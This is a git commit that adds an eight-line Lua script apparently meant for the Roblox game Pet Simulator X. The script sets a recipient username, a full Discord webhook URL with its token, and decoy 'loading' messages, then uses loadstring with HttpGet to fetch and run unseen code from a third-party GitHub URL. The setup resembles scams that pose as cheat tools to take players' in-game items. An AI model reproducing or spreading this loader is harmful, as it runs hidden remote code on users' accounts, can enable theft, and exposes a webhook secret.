e4d7f50512515fac867558bf98d34f1e600cea39
CotoBirka <107920419+CotoBirka@users.noreply.github.com>
2023-03-19 17:45:46 +0300

    Create PetSimX.lua

---
+++ PetSimX.lua
@@ -0,0 +1,8 @@
+Username = "CotoBirka"
+WebHook = "https://discord.com/api/webhooks/1087020703750049883/mVzPcV6TgjadH8iBtS8-YNrGsnfOp2T7-72kHC3HaaS5Q94YumVfiuvwzFLSr96u7r8W"
+_G.CustomScriptName = "Coen"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
